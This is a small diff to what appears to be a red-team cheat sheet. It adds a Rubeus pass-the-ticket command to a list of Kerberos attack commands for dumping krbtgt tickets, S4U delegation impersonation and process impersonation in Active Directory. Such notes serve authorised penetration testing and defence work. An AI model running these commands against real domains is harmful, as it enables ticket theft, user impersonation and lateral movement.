@@ -18,6 +18,7 @@ execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:doIE+
 Rubeus dump /service:krbtgt
 Rubeus s4u /impersonateuser:[username]@[domain] /msdsspn:[AllowedToDelegateTo] /ticket:[...snip...]
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
+Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
 ImpersonateProcess 3420
 ```
 
